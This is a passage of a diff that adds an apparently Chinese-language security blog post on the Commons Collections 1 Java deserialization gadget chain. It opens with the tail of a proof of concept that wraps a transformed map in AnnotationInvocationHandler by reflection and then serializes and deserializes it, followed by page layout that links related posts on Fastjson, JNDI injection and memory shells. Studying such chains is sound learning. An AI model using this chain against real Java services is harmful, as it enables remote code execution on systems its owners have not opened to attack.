+        
+        
+        //反射调用
+        Class c= Class.forName(&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;);
+
+        Constructor annotationInvocationHandlConstructor = c.getDeclaredConstructor(Class.class,Map.class);
+        annotationInvocationHandlConstructor.setAccessible(true);
+        Object o = annotationInvocationHandlConstructor.newInstance(Target.class,transformedMap);
+        //序列化与反序列化
+        serialize(o);
+        unserialize(&quot;ser2.bin&quot;);
+
+    &#125;
+    public static void serialize(Object obj) throws IOException&#123;
+        ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(&quot;ser2.bin&quot;));
+        oos.writeObject(obj);
+    &#125;
+    public static Object unserialize(String Filename) throws IOException,ClassNotFoundException&#123;
+        ObjectInputStream ois = new ObjectInputStream(new FileInputStream(Filename));
+        Object obj = ois.readObject();
+        return obj;
+    &#125;
+
+&#125;
+</code></pre>
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">文章作者: </span><span class="post-copyright-info"><a href="http://example.com">Tree</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">文章链接: </span><span class="post-copyright-info"><a href="http://example.com/2023/04/04/CommonCollections1/">http://example.com/2023/04/04/CommonCollections1/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="http://example.com" target="_blank">Tree's Blog</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/Java/">Java</a></div><div class="post_share"><div class="social-share" data-image="https://raw.githubusercontent.com/todis21/image/main/202304051554165.png" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/2023/04/06/CommonsCollections6/" title="CommonsCollections6"><img class="cover" src="https://raw.githubusercontent.com/todis21/image/main/202304062210726.png" onerror="onerror=null;src='/img/404.png'" alt="cover of previous post"><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">CommonsCollections6</div></div></a></div><div class="next-post pull-right"><a href="/2023/04/02/Java%E4%BB%A3%E7%90%86%E4%B8%8E%E5%8A%A8%E6%80%81%E4%BB%A3%E7%90%86/" title="Java代理与动态代理"><img class="cover" src="https://raw.githubusercontent.com/todis21/image/main/202304031628382.png" onerror="onerror=null;src='/img/404.png'" alt="cover of next post"><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">Java代理与动态代理</div></div></a></div></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>相关推荐</span></div><div class="relatedPosts-list"><div><a href="/2023/04/06/CommonsCollections6/" title="CommonsCollections6"><img class="cover" src="https://raw.githubusercontent.com/todis21/image/main/202304062210726.png" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2023-04-06</div><div class="title">CommonsCollections6</div></div></a></div><div><a href="/2023/04/08/Fastjson%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/" title="Fastjson漏洞分析"><img class="cover" src="https://raw.githubusercontent.com/todis21/image/main/202304092013733.png" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2023-04-08</div><div class="title">Fastjson漏洞分析</div></div></a></div><div><a href="/2023/03/19/JNDI%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0/" title="JNDI注入学习"><img class="cover" src="https://raw.githubusercontent.com/todis21/image/main/202303212056761.png" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2023-03-19</div><div class="title">JNDI注入学习</div></div></a></div><div><a href="/2023/04/02/Java%E4%BB%A3%E7%90%86%E4%B8%8E%E5%8A%A8%E6%80%81%E4%BB%A3%E7%90%86/" title="Java代理与动态代理"><img class="cover" src="https://raw.githubusercontent.com/todis21/image/main/202304031628382.png" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2023-04-02</div><div class="title">Java代理与动态代理</div></div></a></div><div><a href="/2023/04/18/Java%E5%86%85%E5%AD%98%E9%A9%AC/" title="Java内存马"><img class="cover" src="https://su18.org/post-images/memory-shell.png" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2023-04-18</div><div class="title">Java内存马</div></div></a></div><div><a href="/2023/03/16/Java%E5%8F%8D%E5%B0%84/" title="Java反射"><img class="cover" src="https://raw.githubusercontent.com/todis21/image/main/202303162204108.png" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2023-03-16</div><div class="title">Java反射</div></div></a></div></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="/img/favicon.jfif" onerror="this.onerror=null;this.src='/img/404.png'" alt="avatar"/></div><div class="author-info__name">Tree</div><div class="author-info__description">随便都行都可以</div></div><div class="card-info-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">39</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">8</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">0</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/todis21"><i class="fab fa-github"></i><span>Follow Me</span></a><div class="card-info-social-icons is-center"><a class="social-icon" href="https://github.com/todis21" target="_blank" title="Github"><i class="fab fa-github"></i></a><a class="social-icon" href="mailto:3440848736@qq.com" target="_blank" title="Email"><i class="fas fa-envelope-open-text"></i></a></div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#CommonCollections1"><span class="toc-number">1.</span> <span class="toc-text">CommonCollections1</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%89%8D%E8%A8%80"><span class="toc-number">1.1.</span> <span class="toc-text">前言</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA"><span class="toc-number">1.2.</span> <span class="toc-text">环境搭建</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%89%BE%E9%93%BE%E5%AD%90"><span class="toc-number">1.3.</span> <span class="toc-text">找链子</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%BB%93%E6%9D%9F"><span class="toc-number">1.4.</span> <span class="toc-text">结束</span></a></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/2023/04/18/Java%E5%86%85%E5%AD%98%E9%A9%AC/" title="Java内存马"><img src="https://su18.org/post-images/memory-shell.png" onerror="this.onerror=null;this.src='/img/404.png'" alt="Java内存马"/></a><div class="content"><a class="title" href="/2023/04/18/Java%E5%86%85%E5%AD%98%E9%A9%AC/" title="Java内存马">Java内存马</a><time datetime="2023-04-18T12:22:14.000Z" title="发表于 2023-04-18 20:22:14">2023-04-18</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2023/04/11/Shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/" title="Shiro反序列化漏洞"><img src="https://raw.githubusercontent.com/todis21/image/main/202304161714754.png" onerror="this.onerror=null;this.src='/img/404.png'" alt="Shiro反序列化漏洞"/></a><div class="content"><a class="title" href="/2023/04/11/Shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/" title="Shiro反序列化漏洞">Shiro反序列化漏洞</a><time datetime="2023-04-11T05:03:59.000Z" title="发表于 2023-04-11 13:03:59">2023-04-11</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2023/04/08/Fastjson%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/" title="Fastjson漏洞分析"><img src="https://raw.githubusercontent.com/todis21/image/main/202304092013733.png" onerror="this.onerror=null;this.src='/img/404.png'" alt="Fastjson漏洞分析"/></a><div class="content"><a class="title" href="/2023/04/08/Fastjson%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/" title="Fastjson漏洞分析">Fastjson漏洞分析</a><time datetime="2023-04-08T07:19:37.000Z" title="发表于 2023-04-08 15:19:37">2023-04-08</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2023/04/06/CommonsCollections6/" title="CommonsCollections6"><img src="https://raw.githubusercontent.com/todis21/image/main/202304062210726.png" onerror="this.onerror=null;this.src='/img/404.png'" alt="CommonsCollections6"/></a><div class="content"><a class="title" href="/2023/04/06/CommonsCollections6/" title="CommonsCollections6">CommonsCollections6</a><time datetime="2023-04-06T06:19:07.000Z" title="发表于 2023-04-06 14:19:07">2023-04-06</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2023/04/04/CommonCollections1/" title="CommonCollections1"><img src="https://raw.githubusercontent.com/todis21/image/main/202304051554165.png" onerror="this.onerror=null;this.src='/img/404.png'" alt="CommonCollections1"/></a><div class="content"><a class="title" href="/2023/04/04/CommonCollections1/" title="CommonCollections1">CommonCollections1</a><time datetime="2023-04-04T07:10:57.000Z" title="发表于 2023-04-04 15:10:57">2023-04-04</time></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2020 - 2023 By Tree</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox/fancybox.umd.min.js"></script><div class="js-pjax"></div><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/dist/activate-power-mode.min.js"></script><script>POWERMODE.colorful = true;
+POWERMODE.shake = true;
+POWERMODE.mobile = false;
+document.body.addEventListener('input', POWERMODE);
+</script><script id="click-show-text" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/dist/click-show-text.min.js" data-mobile="false" data-text="喵" data-fontsize="15px" data-random="false" async="async"></script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><div id="local-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">搜索</span><span id="loading-status"></span><button class="search-close-button"><i class="fas fa-times"></i></button></nav><div class="is-center" id="loading-database"><i class="fas fa-spinner fa-pulse"></i><span>  数据库加载中</span></div><div class="search-wrap"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="搜索文章" type="text"/></div></div><hr/><div class="no-result" id="local-search-results"></div><div id="local-search-stats-wrap"></div></div></div><div id="search-mask"></div><script src="/js/search/local-search.js"></script></div></div></body></html>
